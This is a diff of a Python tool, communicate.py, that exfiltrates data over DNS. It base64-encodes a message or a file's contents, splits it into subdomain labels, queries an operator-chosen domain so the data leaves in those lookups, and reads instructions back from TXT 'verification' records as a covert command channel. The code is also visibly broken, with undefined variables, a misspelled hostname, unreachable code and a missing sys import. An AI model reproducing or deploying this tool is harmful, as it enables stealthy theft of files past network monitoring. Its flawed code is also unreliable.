@@ -2,7 +2,7 @@
 
 import argparse
 import base64
-from sys import argv
+from sys import argv, exit
 import time
 
 import dns.resolver
@@ -32,55 +32,65 @@ import dns.resolver
 def control_argment():
     parser = argparse.ArgumentParser(
                     usage='communicate.py hostname[e.g. google.com] [-h] '\
-                          '[-m(message] [-i(interval {s}) <e.g. 60>]',\
+                          '[-m[message] [-i(interval {s}) <e.g. 60>]'\
+                          '[-l(length)]',
                     description='Get the value of domain verification')
     parser.add_argument('domain', help='specify the target domain')
-    parser.add_argument('-m', '--message', help='define the message as subdomain')
+    parser.add_argument('-m', '--message', help='define the message as subdomain '\
+                        'www : just sending''mail : count how mang required messages')
     parser.add_argument('-i', '--interval', help='difine the interval time of \
-                        request packet')
-    #parser.add_argument('-dga', '--dga', help='use domain genelation algrorithm', \
-                        #action='store_true')
-
+                        request packet', default=3600)
+    parser.add_argument('-f', '--file', help='extract contents in the file')
+    parser.add_argument('-l', '--length', help='difine the length of subdomain', \
+                        type=int, default=10)
 
     args = parser.parse_args()
 
-    res = {}
-    res['domain'] = args.domain
-    if args.message:
-        res['subdomain'] = args.message
+    valuable = {}
+    valuable['domain'] = args.domain
+    valuable['message'] = args.message
     if args.interval:
-        res['interval'] =args.interval 
-    #if args.dga:
-        # call DGA function
-    #    pass
-    return res
+        valuable['interval'] =args.interval 
+    if args.file:
+        valuable['file'] = args.file
+    if args.length:
+        valuable['length'] = args.length
+    return valuable
 
 
-def parse_message(message:str, length:int=10) ->list:
+def parse_message(message:str, length:int) ->list:
     """
     1. Encode the message to base64
     2. make the list of the message split by the length
     * if you decode the message, put on '=' in the end after comine the line
     """
     encoded = base64.b64encode(message.encode()).decode().strip('=')
-    response = [encoded[i: i+lentgh] for i in range(0, len(encoded), length)]
-    return response
+    separated = [encoded[i: i+length] for i in range(0, len(encoded), length)]
+    return separated
 
 def send(message:str, hostname:str):
     """exfiltrate the data using by subdomain"""
     try:
         qname = message + '.' + hostname
-        dns.resolver.query(qname, 'A')
+        answer = dns.resolver.query(qname, 'A')
+        return answer
     except:
-        print("Can't send or no RR")
+        pass
+        # print("Can't send or no RR")
 
 def query(message:list, hostname:str, interval:int) ->list:
-    """query the value in the TXT"""
     payload = message + '.' + hostname
-    response = dns.resolver.query(payload, 'TXT')
-    verification_line = [str(i).split('=') for i in response[:]\
-                        if 'verification' in str(i)]
-    return verification_line
+    response = dns.resolver.query(payload, rtype)
+    time.sleep(interval)
+    return response
+    # Required the fork of verifications or the other
+    if 'verificaion' in response[:]:
+        verification_line = [str(i).split('=') for i in response[:]\
+                            if 'verification' in str(i)]
+        return verification_line
+    else:
+        return 0
+
 
 def decipher(answer: list) ->str:
     """
@@ -95,14 +105,55 @@ def decipher(answer: list) ->str:
 
     pass
 
+
 def main():
-    argment = control_argment()
-    print(argment.items())
+    valuable = control_argment()
+    hostnmae = valuable['hostname']
+    interval = valuable['interval']
 
-    # Based on the artment, execute the functions
+    if 'message' in valuable.keys():
+        message = valuable['message']
 
+        if message == 'query':
+            # request the number of required pakcets
+            _response = send('mail', hostname)
+            # the number is installed at the last octet of the ipv4 address
+            number = int(str(_response[:]).split('.')[-1].strip('>]'))
+            time.sleep(interval)
+            answer = []
+            while number != 0:
+                query('www', hostname, interval)
+                verification_line = [str(i).split('=') for i in response[:]\
+                                    if 'verification' in str(i)]
+                answer.append(verification_line)
+                number -= 1
+            return answer
 
+        else:
+        # exfiltrate the message to the your server
+            message = parse_message(message, valuable['length'])
+            for _ in message:
+                query(_, hostname, interval)
+            return 0
+
+    else:
+        # exfiltrate the message from file to your auth server
+        if 'file' in valuable.keys():
+            with open(valuable['file'], 'r') as f:
+                _contents = f.read()
+            message = parse_message(_contents, valuable['length'])
+            for _ in message:
+                query(_, hostname, interval)
+            return 0
+
+        else:
+            sys.exit()
 
 if __name__ == '__main__':
-    main()
+    answer = main()
+
+    if answer == 0:
+        sys.exit()
+    else:
+        decoded_text = decipher()
 
